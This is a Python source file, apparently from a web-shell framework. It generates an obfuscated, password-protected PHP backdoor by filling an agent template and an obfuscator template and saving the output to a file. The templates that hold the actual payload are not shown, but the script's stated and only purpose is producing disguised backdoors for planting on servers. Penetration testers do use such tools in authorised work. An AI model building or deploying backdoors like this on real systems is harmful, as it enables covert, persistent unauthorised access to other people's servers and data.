#!/usr/bin/env python

"""Generate obfuscated backdoor.

Usage:
  generate.py <password> <output_file> 
  generate.py <password> <output_file> [--obfuscator=<obfuscator> --agent=<agent>]
  
Options:
  -h --help                    how this screen.
  --obfuscator=<obfuscator>    Backdoor obfuscator [default: obfusc1_php].
  --agent=<agent>              Backdoor agent [default: stegaref_php].

"""

from docopt import docopt
from mako.template import Template
from core.weexceptions import FatalException
from core import messages
import core.log, logging
import os

agent_templates_folder_path = 'bd/agents/'
obfuscators_templates_folder_path = 'bd/obfuscators/'


def generate(password, obfuscator = 'obfusc1_php', agent = 'stegaref_php'):

    
    obfuscator_path = os.path.join(obfuscators_templates_folder_path, obfuscator + '.tpl')
    agent_path = os.path.join(agent_templates_folder_path, agent + '.tpl')
    
    for path in (obfuscator_path, agent_path):
        if not os.path.isfile(path):
            raise FatalException(messages.generic.file_s_not_found % path)
        
    obfuscator_template = Template(filename=obfuscator_path)
    
    
    try:
        agent = Template(open(agent_path,'r').read()).render(password = password)
    except Exception as e:
        raise FatalException(messages.generate.error_agent_template_s_s % (agent_path, str(e)))

    agent = agent.strip(os.linesep)

    try:
        obfuscated = obfuscator_template.render(agent = agent)
    except Exception as e:
        raise FatalException(messages.generate.error_obfuscator_template_s_s % (obfuscator_path, str(e)))
         
    return obfuscated
         
def save_generated(obfuscated, output):
    
    try:
        open(output, 'w+').write(obfuscated)
    except Exception as e:
        raise FatalException(messages.generic.error_creating_file_s_s % (output, e))
         
if __name__ == '__main__':
    arguments = docopt(__doc__)
    password = arguments['<password>']
    output = arguments['<output_file>']
    
    obfuscated = generate(password, arguments['--obfuscator'], arguments['--agent'])
    save_generated(obfuscated, output)
    
    logging.info(messages.generate.generated_backdoor_with_password_s_in_s % (password, output))
    
    
